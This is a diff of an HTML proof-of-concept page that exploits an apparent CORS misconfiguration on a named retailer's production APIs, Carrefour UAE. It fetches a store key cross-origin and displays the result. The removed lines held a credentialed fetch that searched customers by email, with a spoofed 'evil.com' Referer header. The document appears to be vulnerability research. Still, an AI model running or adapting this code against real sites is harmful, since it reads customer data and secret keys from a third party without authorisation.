@@ -4,36 +4,49 @@
   <meta charset="UTF-8">
   <title>Carrefour UAE - Get Store Key PoC</title>
   <style>
-    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
-    button { padding: 10px 15px; font-size: 16px; cursor: pointer; }
-    pre { background: #fff; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; max-height: 500px; overflow: auto; }
+    body {
+      font-family: sans-serif;
+      background: #f4f4f4;
+      padding: 20px;
+    }
+    button {
+      padding: 10px 15px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    pre {
+      background: #fff;
+      padding: 15px;
+      border: 1px solid #ccc;
+      white-space: pre-wrap;
+      max-height: 500px;
+      overflow: auto;
+    }
   </style>
 </head>
 <body>
   <h2>🚨 CORS PoC – Get Store Key</h2>
-  <button onclick="fetchStoreKey()">Fetch Store Key</button>
+  <button id="fetchBtn">Fetch Store Key</button>
   <pre id="output">Click the button above to fetch response from target API.</pre>
 
   <script>
+    document.getElementById("fetchBtn").addEventListener("click", fetchStoreKey);
+
     function fetchStoreKey() {
       document.getElementById("output").textContent = "⏳ Fetching...";
 
-      fetch("https://www.carrefouruae.com/v2/customers/channel/search?email=fohof13749%40modirosa.com", {
-  method: "GET",
-  headers: {
-    "Appid": "Reactweb",
-    "Env": "prod",
-    "Lang": "en",
-    "Langcode": "en",
-    "Referer": "https://evil.com",  // Can be arbitrary
-  },
-  credentials: "include", // Required if cookies/session tokens needed
-  mode: "cors"
-})
-.then(res => res.text())
-.then(console.log)
-.catch(console.error);
-
+      fetch("https://api-prod.retailsso.com/v1/instorecompanion/getstorekey?latitude=0&longitude=0", {
+        method: "GET",
+        mode: "cors",
+        headers: {
+          "Appid": "Web",
+          "Langcode": "en",
+          "Referer": "https://instore.carrefouruae.com",
+          "Env": "prod",
+          "Lang": "en",
+          "Storeid": "mafuae"
+        }
+      })
       .then(response => response.text())
       .then(data => {
         document.getElementById("output").textContent = data;
